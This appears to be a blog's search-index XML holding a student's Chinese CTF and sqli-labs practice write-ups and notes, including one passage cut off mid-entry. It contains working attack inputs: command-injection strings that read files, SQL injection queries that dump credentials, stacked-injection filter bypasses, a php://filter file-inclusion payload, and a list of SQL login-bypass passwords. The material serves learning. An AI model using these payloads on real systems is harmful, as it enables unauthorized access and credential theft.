<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>寒假练习7</title>
      <link href="test12/undefined-undefined.html"/>
      <url>test12/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天练车，就先学习Linux命令使用吧。  </p><h1 id="ACTF2020-新生赛-Exec-1"><a href="#ACTF2020-新生赛-Exec-1" class="headerlink" title="[ACTF2020 新生赛]Exec 1"></a>[ACTF2020 新生赛]Exec 1</h1><p>打开题目，发现让我们ping一个网址<br><img src="https://i.loli.net/2021/01/21/FmHKRL1dN8cjblX.png" alt="52.png"><br>于是随便ping了一个网址。发现返回成功。那么接下来我们要查询包含的文件。如何做到多个语句的执行呢，这里需要用到管道符，从而达到多命令执行的效果。<br><a href="https://blog.csdn.net/liucy007/article/details/90209277?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control">Linux之管道符</a><br><img src="https://i.loli.net/2021/01/21/zliKdXRn1bqmcDp.png" alt="53.png"><br>首先我们先查询文件，使用ls命令。<br><img src="https://i.loli.net/2021/01/21/1dknwmhKyL7O6Ce.png" alt="54.png"><br>知道包含一个index.php文件，接着打开这个文件。  </p><blockquote><p>127.0.0.1;cat index.php</p></blockquote><p><img src="https://i.loli.net/2021/01/21/zIcaZ4U3Ef1TMSG.png" alt="55.png"><br>可以在网页源码中发现文件的里面的代码，或者使用tac命令也可以显示源码。<br>可以看到源码中没有任何过滤，是一个简单的命令执行。但是我们用ls并没有发现flag文件，说明它可能在别的目录下。<br>于是可以使用ls /来查看根目录。<br><img src="https://i.loli.net/2021/01/21/Cl5cjAQXuyZon8h.png" alt="56.png"><br>发现包含flag的文件，使用cat /flag查看这个文件的内容。<br><img src="https://i.loli.net/2021/01/21/JXkoVDpbTfj3tda.png" alt="57.png"><br>得到flag。  </p><hr><p>这道题主要考察命令执行和Linux的命令使用，不算很难，管道符的使用是第一次见，感觉和sql注入的“；”和联合注入有相同的地方，都是为了执行多个语句。下面附上一些常用的管道符。  </p><blockquote><p><strong>1、|（就是按位或），直接执行|后面的语句</strong></p></blockquote><blockquote><p><strong>2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</strong></p></blockquote><blockquote><p><strong>3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假</strong></p></blockquote><blockquote><p><strong>4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</strong></p></blockquote><blockquote><p><strong>5、;（linux下有的，和&amp;一样的作用）</strong>  </p></blockquote><p>同时附上一篇讲解Linux命令的博客，讲的十分详细了。<br><a href="https://blog.csdn.net/xiaoguaihai/article/details/8705992?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-8705992.pc_search_result_before_js&spm=1018.2226.3001.4187">【Linux】linux常用基本命令 </a></p>]]></content>
      
      
      <categories>
          
          <category> test12 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql闯关2</title>
      <link href="test11/undefined-undefined.html"/>
      <url>test11/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这个第二关就是第一关的一个变形。  </p><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>打开界面，按照流程先来判断注入类型。  </p><blockquote><p>?id=1 and 1=1<br>?id=1 and 1=2<br>?id=1’ and ‘1’=’1<br>?id=1’ amd ‘1’=’2</p></blockquote><p>在做这道题之前没有发现为什么要判断这个注入类型，因为看到别人用的语句没有什么变化，但是这道题让我知道二者还是有区别的。详细还是看这篇文章吧。<br><a href="https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=&request_id=&biz_id=102&utm_term=%25E4%25B8%25BA%25E4%25BB%2580%25E4%25B9%2588sql%25E6%25B3%25A8%25E5%2585%25A5%25E8%25A6%2581%25E4%25BD%25BF%25E7%2594%25A8%25E5%258D%2595%25E5%25BC%2595%25E5%258F%25B7&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-90296495.first_rank_v2_pc_rank_v29">sql注入基础原理（超详细)</a><br>简而言之，当是数字型注入时，后台执行的sql语句在id=1后面和句子后面是没有<strong>“</strong>‘<strong>”</strong>的，这也就是说，我们不需要构建payload时在结<br>尾加上注释符号#或者–+了。其余的和字符型注入相比没什么变化。  </p><hr><p><strong>数字型注入后台执行的sql语句</strong></p><blockquote><p>select * from &lt;表名&gt; where id = x and 1=1</p></blockquote><p><strong>字符型注入后台执行的sql语句</strong></p><blockquote><p>select * from &lt;表名&gt; where id = ‘x’ and ‘1’=’1’</p></blockquote><hr><p>接下来按照流程就行了。<br>爆库名和表名 </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>爆字段名  </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),(select group _concat(table _name) from information _schema.tables where table _  schema=’security’)</p></blockquote><p>爆字段信息  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><hr><p>这道题算是进一步让我明白数字型注入和字符型注入了。<br>其实关于sql注入，其实也就是利用对输入字符的筛选漏洞来执行一些恶意的sql语句。sql语句不难学，主要还是如何找到它筛选的漏洞和如何绕过他们的筛选。</p>]]></content>
      
      
      <categories>
          
          <category> test11 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习6</title>
      <link href="test10/undefined-undefined.html"/>
      <url>test10/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天还是sql注入题，巩固基础。  </p><h1 id="极客大挑战-2019-LoveSQL-1"><a href="#极客大挑战-2019-LoveSQL-1" class="headerlink" title="[极客大挑战 2019]LoveSQL 1"></a>[极客大挑战 2019]LoveSQL 1</h1><p>打开题目，发现和前面做过的一样的界面。<br><img src="https://s3.ax1x.com/2021/01/20/sWlHgS.md.png" alt="sWlHgS.md.png"><br>先想到的就是用万能密码来做一下。输入1’ or 1=1#登录后后出现另一个界面。<br><img src="https://s3.ax1x.com/2021/01/20/sW3mZj.md.png" alt="sW3mZj.md.png"><br>给了我们用户名和密码，回到原界面输入用户名和密码后发现又回到这个页面。所以说万能密码不能解决问题。<br>那么还是老老实实按步骤来吧。先看看有几个字段。<br>发现当输到<strong>1’ order by 4#**出现报错，而前面的都是显示密码和用户名错误。（</strong>注意在用户名一栏中输入以上语句后因为后面有#，相当于把密码注释掉了，所以密码输入什么无关紧要。**）<br>那么就有三个字段，接着看看哪几位会有回显。输入1’ union select 1,2,3#<br><img src="https://i.loli.net/2021/01/20/q8XwkGx3vc7fJOi.png" alt="48.png"><br>可以看到2，3位有回显，那么这道题就变成之前做过的闯关第一关的样题了。<br>输入?id=1’ union select 1,2,database()#爆库名<br><img src="https://i.loli.net/2021/01/20/LSZJ6zGc73pObuj.png" alt="49.png"><br>得到库名，接下来就是爆表名，爆字段了。  </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’geek’),database()#</p></blockquote><p><img src="https://i.loli.net/2021/01/20/NOkZo6mbBsPRdEV.png" alt="50.png"><br>得到表名,我们查看l0ve1ysq1这个表里面的字段。  </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’l0ve1ysq1’ </p></blockquote><p><img src="https://i.loli.net/2021/01/20/sqy9Tb6ptg2JZr3.png" alt="51.png"><br>得到表里面的字段名字，接下来就是分别查这三个字段里面的信息。  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><p>flag在password里。  </p><hr><p>这道题其实就是闯关第一关的翻版。并不是很难。</p>]]></content>
      
      
      <categories>
          
          <category> test10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习5</title>
      <link href="test9/undefined-undefined.html"/>
      <url>test9/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天来一道捉迷藏的题目。  </p><h1 id="极客大挑战-2019-Secret-File-1"><a href="#极客大挑战-2019-Secret-File-1" class="headerlink" title="[极客大挑战 2019]Secret File 1"></a>[极客大挑战 2019]Secret File 1</h1><p>打开题目，发现如下界面。<br><img src="https://s3.ax1x.com/2021/01/19/sg4bfx.md.png" alt="sg4bfx.md.png"><br>看见这种界面，而且没有可以点的地方的题目一律f12伺候。<br>从源码中可以看到有一个php文件。<br><img src="https://s3.ax1x.com/2021/01/19/sgIlad.md.png" alt="sgIlad.md.png"><br>于是我们就打开这个Archive_room.php文件。<br><img src="https://s3.ax1x.com/2021/01/19/sgTS74.md.png" alt="sgTS74.md.png"><br>果然跳转到另一个页面，这次还有一个点击按钮，点一下试试。<br><img src="https://s3.ax1x.com/2021/01/19/sgbM4J.md.png" alt="sgbM4J.md.png"><br>就知道不会那么简单，对这种一闪而过的情况直接进行抓包，给他拦下来。<br><img src="https://s3.ax1x.com/2021/01/19/sgbW5Q.md.png" alt="sgbW5Q.md.png"><br>通过抓包可以看到中间还经过了一个php页面，于是再回到题目中输入一下。<br><img src="https://s3.ax1x.com/2021/01/19/sgqwZT.md.png" alt="sgqwZT.md.png"><br>跳转到源码页面了。<br>这个代码很容易懂，通过get方式传参一个file变量，而且有include()<br>函数，很明显是一个文件包含漏洞。可以用伪协议来做这道题。同时可以看到它过滤了一些伪协议，但是相较于之前学长出过的题过滤的还是太轻了（哈哈哈哈哈）。<br>直接使用php://filter协议读取flag.php里面的源码。构造payload。  </p><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><p>这样就能得到经过base64编码过的源码，再解码一下就能得到flag。<br><img src="https://s3.ax1x.com/2021/01/19/sgjXcj.md.png" alt="sgjXcj.md.png"><br>这道题目主要还是找到藏着的php文件，后面的代码审计反而比较简单。 </p><hr><p>附上我的php伪协议笔记<br><a href="https://george186.github.io/note2/undefined-undefined.html">php伪协议总结</a></p>]]></content>
      
      
      <categories>
          
          <category> test9 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>万能密码总结</title>
      <link href="note3/undefined-undefined.html"/>
      <url>note3/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>将从网上查到的一些sql注入的万能密码记录下来，以便以后使用。  </p><h1 id="PHP语言"><a href="#PHP语言" class="headerlink" title="PHP语言"></a>PHP语言</h1><p>‘or 1=1/*<br>“or “a”=”a<br>“or 1=1–<br>“or”=”<br>“or”=”a’=’a<br>“or1=1–<br>“or=or”<br>‘’or’=’or’<br>‘) or (‘a’=’a<br>‘.).or.(‘.a.’=’.a<br>‘or 1=1<br>‘or 1=1–<br>‘or 1=1/*<br>‘or”=”a’=’a<br>‘or’ ‘1’=’1’<br>‘or’’=’<br>‘or’’=’’or’’=’<br>‘or’=’1’<br>‘or’=’or’<br>‘or.’a.’=’a<br>‘or1=1–<br>1’or’1’=’1<br>a’or’ 1=1–<br>a’or’1=1–<br>or ‘a’=’a’<br>or 1=1–<br>or1=1–  </p><h1 id="asp-aspx语言"><a href="#asp-aspx语言" class="headerlink" title="asp aspx语言"></a>asp aspx语言</h1><p>“or “a”=”a<br>‘.).or.(‘.a.’=’.a<br>or 1=1–<br>‘or 1=1–<br>a’or’ 1=1–<br>“or 1=1–<br>‘or.’a.’=’a<br>“or”=”a’=’a<br>‘or’’=’<br>or’=’or’  </p><h1 id="jsp语言"><a href="#jsp语言" class="headerlink" title="jsp语言"></a>jsp语言</h1><p>1’or’1’=’1<br>admin’ or 1=1/*  </p>]]></content>
      
      
      <categories>
          
          <category> note3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习4</title>
      <link href="test8/undefined-undefined.html"/>
      <url>test8/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天还是注入题。  </p><h1 id="极客大挑战-2019-EasySQL-1"><a href="#极客大挑战-2019-EasySQL-1" class="headerlink" title="[极客大挑战 2019]EasySQL 1"></a>[极客大挑战 2019]EasySQL 1</h1><p>打开页面，发现这次和之前的注入有点不一样。<br><img src="https://s3.ax1x.com/2021/01/18/scS2bq.md.png" alt="scS2bq.md.png"><br>这次让输入两个值，分别是用户名和密码，而之前输入的都只有一个。但是还是按照之前的顺序来，先判断有没有注入。<br>输入username=1’,password=1’发现回显出错。<br><img src="https://s3.ax1x.com/2021/01/18/scpQLn.md.png" alt="scpQLn.md.png"><br>由出错可以判断出是字符型注入。<br>接着是查询字段，但是输入1’ order by 1# 等却无法查询，仍然是报错。<br>那就跳过这一步，接着就是查看是否有显示位。我输入的是  </p><blockquote><p>username=999’ union select 1,2,database()#</p></blockquote><p>结果直接出flag了，十分懵b。<br><img src="https://s3.ax1x.com/2021/01/18/sc9qN6.md.png" alt="sc9qN6.md.png"><br>接着我又查了一下别人的做法，发现别人用到了万能密码来做，下面讲解一下万能密码。  </p><hr><h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>用户进行用户名和密码验证时，网站需要查询数据库。查询数据库就是执行SQL语句。<br>用户登录时，后台执行的数据库查询操作（SQL语句）是：<br>【Select user _ id,user _ type,email From users Where user _ id=’用户名’ And password=’密码’】。<br>由于网站后台在进行数据库查询的时候没有对单引号进行过滤，当输入用户名【admin】和万能密码【2’or’1】时，执行的SQL语句为：<br>【Select user _ id,user _ type,email From users Where user _ id=’admin’ And password=’2’or’1’】。<br>由于SQL语句中逻辑运算符具有优先级，【=】优先于【and】，【and】优先于【or】，且适用传递性。因此，此SQL语句在后台解析时，分成两句：<br>【Select user _ id,user _ type,email From users Where user _ id=’admin’ And password=’2’】和【’1’】，两句bool值进行逻辑or运算，恒为TRUE。<br>SQL语句的查询结果为TRUE，就意味着认证成功，也可以登录到系统中。<br>输入用户名【admin】，密码【2’or’1】，即可登录成功。  </p><hr><p>简而言之这个就是利用or的判定方式（左右两边只要一边为真，那么总体为真）来通过SQL语句的查询认证。同理，万能密码还会有很多，比如username=1’ or 1=1#,这样实际上执行的SQL语句就成为了<br>【Select user _ id,user _ type,email From users Where username=’1’】和【1=1】。（#为SQL的注释符，所以#后面的字符不再进行判定）<br>因为后面为真，所以SQL语句查询where的判定为真。也就通过了查询认证，所以得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> test8 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入闯关1</title>
      <link href="test7/undefined-undefined.html"/>
      <url>test7/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>要想学sql注入，就要不断练习。而sqli-labs这个闯关游戏就是一个很好的练习条件。这个寒假要过前十关。<br>关于这个游戏的安装百度即可，就不做详细记录了。<br><a href="https://blog.csdn.net/weixin_42277564/article/details/80583959?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161090447216780269871621%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=161090447216780269871621&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-80583959.first_rank_v2_pc_rank_v29&utm_term=sql%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2">sql注入的联合查询</a></p><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>打开第一关，可以看到很简洁的界面。<br><img src="https://s3.ax1x.com/2021/01/17/syuvdg.md.png" alt="syuvdg.md.png"><br>让我们在url中输入变量id。先输入?id=1后回显如下。<br><img src="https://s3.ax1x.com/2021/01/17/syKOpR.md.png" alt="syKOpR.md.png"><br>但是输入?id=1’后报错，说明存在sql注入。<br>接下来按照程序一步步来。先来判断注入类型。  </p><blockquote><p>?id=1 and 1=1<br>?id=1 and 1=2<br>?id=1’ and ‘1’=’1<br>?id=1’ amd ‘1’=’2</p></blockquote><p>发现最后一个没有回显，所有知道是字符型注入。<br>接着判断字段个数。  </p><blockquote><p>?id=1’ order by 1–+<br>?id=1’ order by 2–+<br>?id=1’ order by 3–+<br>?id=1’ order by 4–+</p></blockquote><p>发现第四个时出现错误，说明有这个表有三个字段，也就是三列。<br><img src="https://img.imgdb.cn/item/600460473ffa7d37b3b711fa.png"><br>接着查看页面的显示位。也就是拿哪几位会显示到界面上。输入以下payload  </p><blockquote><p>?id=999’ union select 1,2,3–+</p></blockquote><p>注意不能是?id=1或?id=2之类的，因为这样会输出id=1或id=2的一行行的数据，这就无法判断是那一位回显到页面上了。但如果我们输入一个不存在的id，那么第一行就会变成空行，这时候union后面的查询语句就成为了第一行，相应的2，3位就显示在页面上了。<br><img src="https://img.imgdb.cn/item/600462263ffa7d37b3b7ed5a.png"><br>可以看出2，3位回显到页面，那么接下来构造payload要在2，3为上改动。<br>接下来爆库名  </p><blockquote><p>?id=1’ union select 1,2,database()–+</p></blockquote><p>可以查看当前使用的库的名称。<br><img src="https://s3.ax1x.com/2021/01/18/sylSFe.md.png" alt="sylSFe.md.png"><br>可以知道数据库的名字为<strong>security</strong>，接下来就是爆这个数据库中的表名了。这里的语句比较长，但是很好理解，语句如下。  </p><blockquote><p>?id=1’ union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>注意这个语句要用括号括起来，否则会出错。具体原因我还没有找到。。。。<br>那么我们来理解一下这个新的长语句的意思吧。  </p><hr><blockquote><p>(select group _concat(table _name) from information _schema.tables where table _  schema=’security’)</p></blockquote><p>这个句子中有一个group_ concat()函数，这个函数的作用将对应字段的所有结果都查找并组合返回到一条记录中。<br><code>在SQL中这个函数可以将某一字段符合要求的该段对应的行的数据在一行显示。</code><br>而table _name很好理解，它就是表的名字的意思。<br>接下来是information _schema.tables。我们已经知道information _schema是系统自带的库，它包含了所有库的信息。所以information _schema.tables就是所有库中的表的信息。<br>where这个相当于编程中的if语句，它是一个判断语句。<br>table _ schema是数据库名称的意思。  </p><hr><p>综上可以知道这个语句的意思：从information _schema.tables中查询表的名字当数据库的名字为’security’。<br>也就是查询’security’库中所有表的名字并返回到到一条记录中。<br>得到的结果如图。<br><img src="https://s3.ax1x.com/2021/01/18/sy1z2d.md.png" alt="sy1z2d.md.png"><br>可以得到security库中有emails，referers，uagents，users四个表。<br>那么接下来就是爆字段了。  </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’users’ </p></blockquote><p>爆出users表中的字段。<br><img src="https://s3.ax1x.com/2021/01/18/sy3GiF.md.png" alt="sy3GiF.md.png"><br>可以知道有id，username，password三个字段。那么接下来就是查询这三列的信息了。  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/18/syGi4S.md.png" alt="syGi4S.md.png"><br>from security.users表示从security数据库users表中查询。<br>得到用户信息。其他的表按照上述操作即可。</p><hr><h1 id="知识点小结："><a href="#知识点小结：" class="headerlink" title="知识点小结："></a>知识点小结：</h1><p>1：database()是一个函数，可以查看当前使用的数据库名字。<br>2：group_ concat()函数，这个函数的作用将对应字段的所有结果都查找并组合返回到一条记录中。<br>3：information _schema.tables包含了所有库中表的信息，此外还有information _schema.columns（包含所有库中列的信息。）等。<br>4：table _name，columns _ name等均可以直译。<br>5：sql注入语句逻辑很好理解，可以当成英语语句或者编程语句来理解。大致如下：<br>select ···查询···<br>from ···从···中<br>where···当···时</p>]]></content>
      
      
      <categories>
          
          <category> test7 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习3</title>
      <link href="test6/undefined-undefined.html"/>
      <url>test6/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天练手第一道sql注入题目<br>先附上我学习sql注入的几个博客链接，他们帮了我很多忙。<br><a href="https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=&request_id=&biz_id=102&utm_term=%25E4%25B8%25BA%25E4%25BB%2580%25E4%25B9%2588sql%25E6%25B3%25A8%25E5%2585%25A5%25E8%25A6%2581%25E4%25BD%25BF%25E7%2594%25A8%25E5%258D%2595%25E5%25BC%2595%25E5%258F%25B7&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-90296495.first_rank_v2_pc_rank_v29">sql注入基础原理（超详细)</a>  </p><h1 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a>[强网杯 2019]随便注 1</h1><p>题目说是随便注，他可一点也不随便啊，它是有备而来。打开题目发现很简洁。<br><img src="https://s3.ax1x.com/2021/01/17/ssnrz6.md.png" alt="ssnrz6.md.png"><br>因为是新手，所以一步一步来。<br>输入1’提交发现回显错误。由此可以知道存在sql注入。<br><img src="https://s3.ax1x.com/2021/01/17/ssn2ee.md.png" alt="ssn2ee.md.png"><br>先输入以下payload来判断是什么类型的注入。  </p><blockquote><p>1 and 1=1<br>1 and 1=2<br>1’ and ‘1’=’1<br>1’ and ‘1’=’2</p></blockquote><p>发现只有第四个输入时报错，所以可以知道这个是字符型注入。<br>接下来就是查询有几个字段。分别输入以下来查询字段个数。  </p><blockquote><p>1’ order by 1#<br>1’ order by 2#<br>1’ order by 3#</p></blockquote><p>发现当输入到**1’ order by 3#**时报错，说明该表只有两个字段。（也就是两列）<br><img src="https://s3.ax1x.com/2021/01/17/ssKAu8.md.png" alt="ssKAu8.md.png"><br>接下来就是爆表爆库了，我一开始打算使用联合查询来查当前数据库名。输入了以下语句。  </p><blockquote><p>1’ union select database()#</p></blockquote><p>结果却是这样。<br><img src="https://s3.ax1x.com/2021/01/17/ssKDKK.md.png" alt="ssKDKK.md.png"><br>一个正则匹配函数把selet字符给过滤了。这就说明我不能使用联合查询了。那该怎么办呢，通过查询资料发现还有一种堆叠注入方式可以实现查询。  </p><blockquote><p>堆叠注入：在SQL中，分号表示一条sql语句的结束，在结束一条sql语句后继续下一条语句，会被一起执行；这也就形成了堆叠注入。</p></blockquote><p>其次select，where字符被屏蔽，那么该如何查表名和库名呢。<br><strong>可以使用show。</strong>  </p><blockquote><p>1.show databases;数据库名字<br>2.show tables;表名<br>3.show columns from table;字段</p></blockquote><p>所以可以构建以下语句来查表名，库名。  </p><blockquote><p>1’; show databases;#</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/17/ssNBH1.md.png" alt="ssNBH1.md.png"><br>得到所有库名，其中information_schema和performance _schema，test是自带的库，经过查询发现flag是在supersqli这个库中，输入</p><blockquote><p>1’;show tables from supersqli;#</p></blockquote><p>就可以得到supersqli库中表的名字。<br><img src="https://s3.ax1x.com/2021/01/17/ssURiV.md.png" alt="ssURiV.md.png"><br>分别查询这两个表中的字段。  </p><blockquote><p>1’;show columns from words;#<br>1’;show columns from <code>1919810931114514</code>;#</p></blockquote><p>注意在查询1919810931114514库时，直接输入其库名是查不出来的，这是因为这个库名会和MySQL的关键字冲突，这时候要在库名前后加上“`”这个符号来说明它不是关键字，也就是转义。<br>查询后发现flag字符串在1919810931114514表内。<br><a href="https://imgchr.com/i/ssaawR"><img src="https://s3.ax1x.com/2021/01/17/ssaawR.md.png" alt="ssaawR.md.png"></a><br>接下来就是如何读取flag字段中的内容了。<br>因为select不能使用，在网上查询后得知还有handler语句可以查询表中数据，语法为  </p><blockquote><p>HANDLER tbl_ name OPEN打开一张表<br>HANDLER tbl_ name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</p></blockquote><p>所以试着输入以下语句  </p><blockquote><p>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;–+</p></blockquote><p>这里的注释要用–+，使用#注释会显示不出来（我还不知道为什么）可能是没转码。<br>这样就可以得到flag。  </p><hr><p>但是这种方法只对于MySQL有用，应该还有别的通用方法，我查询了更多人的wp，发现的确如此。<br>因为select被过滤了，所以先将select * from 1919810931114514进行16进制编码，在构造  </p><blockquote><p>1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p></blockquote><p>进而得到flag<br>或者</p><blockquote><p>1’;set @a=concat(“sel”,”ect flag from 1919810931114514 “);prepare hi from @a;execute hi;#  </p></blockquote><p>也可得到flag</p><p>其中prepare…from…是预处理语句，会进行编码转换。<br>execute用来执行由SQLPrepare创建的SQL语句。<br>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。<br>也就是说先给@a赋值为select * from 1919810931114514的十六进制编码。，然后后再使用prepare…from…进行编码转换，从而查询表中的所有信息。  </p><hr><p>还有一种方法，就是先用rename将words表名改为其他名字，再将1919810931114514表名改为words，将flag列改为id，最后输入1’ or 1=1#来查看flag列的内容。<br>但是这个方法我还没试成功过，思路是没问题的，只是我暂时没搞懂(太菜了）。 </p>]]></content>
      
      
      <categories>
          
          <category> test6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习2</title>
      <link href="test5/undefined-undefined.html"/>
      <url>test5/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>最近两天刚学sql注入，发现还是要有数据库的基础才行，（否则连sql的语句都看不懂啥意思）所以正在学数据库，sql的题暂时就先放一下，先做别的题了。当然也会更新一下学数据库的笔记。  </p><h1 id="极客大挑战-2019-Havefun-1"><a href="#极客大挑战-2019-Havefun-1" class="headerlink" title="[极客大挑战 2019]Havefun 1"></a>[极客大挑战 2019]Havefun 1</h1><p>这道题目还是很简单的，打开题目发现一只猫。<br><img src="https://s3.ax1x.com/2021/01/16/sDcJEQ.md.png" alt="sDcJEQ.md.png"><br>对于这种页面点不动的题，直接查看源码。<br><img src="https://s3.ax1x.com/2021/01/16/sDc5DO.md.png" alt="sDc5DO.md.png"><br>可以看到源码中将<strong>cat</strong>设为变量，并使用get方式传参。后面又说当变量cat==dog这个字符串时，就会显示flag。<br>那么接下来就很简单了。直接在url上输入就可以了。<br><img src="https://s3.ax1x.com/2021/01/16/sDgjY9.md.png" alt="sDgjY9.md.png"><br>得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> test5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习1</title>
      <link href="test4/undefined-undefined.html"/>
      <url>test4/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>寒假到了，菜鸡练习时间到了。争取每天至少buuctf一道题，并且加上sql注入的学习。<br>因为太长没练手了，所以先来一道代码审计题。</p><h1 id="HCTF-2018-WarmUP1"><a href="#HCTF-2018-WarmUP1" class="headerlink" title="[HCTF 2018]WarmUP1"></a>[HCTF 2018]WarmUP1</h1><p>打开题目发现只有一个大滑稽。<br>于是查看源码<br><img src="https://s3.ax1x.com/2021/01/15/s0MjeJ.md.png" alt="s0MjeJ.md.png"><br>发现&lt; !–source.php– &gt;这个php文件，于是再在网址中打开就可以发现真正的源码（截图没有截全）<br><img src="https://s3.ax1x.com/2021/01/15/s0QJTs.md.png" alt="s0QJTs.md.png"><br>观察可以发现还有一个hint.php文件，于是在网址打开它看一下。<br><img src="https://s3.ax1x.com/2021/01/15/s0QX1f.md.png" alt="s0QX1f.md.png"><br>可以知道flag被放在ffffllllaaaagggg目录中，又因为下面的代码中有include（）这个包含函数，并且要上传file这个参数。<br><img src="https://s3.ax1x.com/2021/01/15/s0lI2V.md.png" alt="s0lI2V.md.png"><br>这就要求我们要满足 checkFile(&amp;$page)函数，然后再构造payload，使用../进行跳转到ffffllllaaaagggg目录，就可以得到flag。<br>那么接下来就是对这个函数进行研究。  </p><blockquote><p>if (! isset($page) || !is_string($page))</p></blockquote><p>由这串代码可以看出page为变量，同时是一个字符串。<br>随后这个程序定义了两个字符串为白名单（$whitelist）也就是可以通过的字符串。分别为  </p><blockquote><p>source.php和hint.php</p></blockquote><p>也就是说我们的上传的变量<strong>page</strong>经过变换后要是上面二者之一才能通过checkFile(&amp;$page)函数。  </p><hr><p>先看第一个判断  </p><pre><code>            if (in_array($page, $whitelist)) &#123;                return true;            &#125;</code></pre><p>可以看出这个是直接将page和白名单进行比较，虽然我们直接输入那两个字符串就可以通过，但是这样没有办法用../来跳转目录，所以第一个是没办法绕过的。  </p><hr><p>再来看第二个。  </p><pre><code>            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;  </code></pre><p>这个里面的新函数有substr()和strpos()。  </p><blockquote><p>mb _ substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。<br>其中该函数有三个参数</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/15/s0YVjx.md.png" alt="s0YVjx.md.png"><br>而mb_strpos()函数作用如下  </p><blockquote><p>查找 “php” 在字符串中第一次出现的位置：</p></blockquote><p>他也有三个参数。<br><img src="https://s3.ax1x.com/2021/01/15/s0Yox1.md.png" alt="s0Yox1.md.png"><br>将这两个函数联系起来可以发现输入的page字符串最后被截取到“？”这个位置，如我们输入以下字符串  